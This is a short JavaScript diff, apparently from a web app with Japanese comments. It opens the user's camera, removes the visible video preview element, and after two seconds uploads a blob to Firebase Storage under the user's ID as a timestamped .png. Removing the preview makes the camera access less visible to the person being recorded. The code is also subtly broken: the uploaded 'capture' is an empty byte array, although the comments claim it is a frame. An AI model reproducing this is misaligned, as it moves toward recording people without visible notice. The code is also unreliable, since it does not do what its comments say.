@@ -32,26 +32,19 @@
     // カメラにアクセス
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(function (stream) {
-        // video要素にストリームをセット
-        const video = document.createElement('video');
-        document.body.appendChild(video);
-        video.srcObject = stream;
-        video.play();
-
         // カメラのストリームからキャプチャ
         setTimeout(function () {
           // video要素を描画せずにそのままblobに変換
           const blob = new Blob([new Uint8Array()]);
-          
+
           // Firebase Storageにアップロード
           const storageRef = storage.ref(`${userId}/${Date.now()}.png`);
           storageRef.put(blob).then(function(snapshot) {
             console.log('Uploaded a blob!');
           });
 
-          // ストリームを停止してvideo要素を削除
+          // ストリームを停止
           stream.getTracks().forEach(track => track.stop());
-          document.body.removeChild(video);
         }, 2000); // 2秒後にキャプチャ
       })
       .catch(function (error) {
